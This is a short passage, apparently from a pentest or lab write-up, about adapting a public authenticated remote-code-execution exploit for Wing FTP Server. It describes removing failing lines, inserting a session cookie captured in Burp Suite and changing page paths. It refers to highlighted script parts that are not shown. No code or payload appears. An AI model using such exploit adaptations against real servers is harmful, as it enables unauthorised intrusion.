# Exploit Title: Wing FTP Server - Authenticated RCE
I removed the parts where highlighted in red colour as it was giving me an execution
error and I added the cookie ID manually by retrieving the ID on the intercepted traffic in
burp suite as shown below. And also added so that when the exploit 
is executed the base64 encoded text is printed out. And the yellow highlighted part in 
the above script was edited so that it would match the pages in the host 
/admin_login.html
